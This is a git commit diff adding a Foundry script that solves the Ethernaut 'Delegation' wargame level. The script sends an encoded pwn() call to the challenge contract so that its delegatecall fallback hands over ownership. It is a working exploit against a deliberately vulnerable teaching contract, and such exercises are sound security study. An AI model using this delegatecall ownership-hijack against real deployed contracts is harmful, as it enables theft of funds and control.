64b8d367470a2dccdd76ea4b2853b3c12f52c895
siegfriedbz <siegfried.bozza@yahoo.com>
2025-05-11 17:00:56 +0200

    add DelegationScript solution

--- script/DelegationScript.s.sol
+++ script/DelegationScript.s.sol
@@ -5,12 +5,21 @@ import "../src/Delegation.sol";
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
 
-contract MagicNumScript is Script {
+error AttackFailed();
+
+contract DelegationScript is Script {
     address constant ETHERNAUT_CONTRACT_ADDRESS = 0x29Ab8387a28A684617a365d0738ef106BCf6b5B6;
     Delegation public delegation = Delegation(ETHERNAUT_CONTRACT_ADDRESS);
 
     function run() external {
+        bytes memory pawnSig = abi.encodeWithSignature("pwn()");
+
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        (bool success,) = address(delegation).call(pawnSig);
+        if (!success) {
+            revert AttackFailed();
+        }
 
         vm.stopBroadcast();
     }
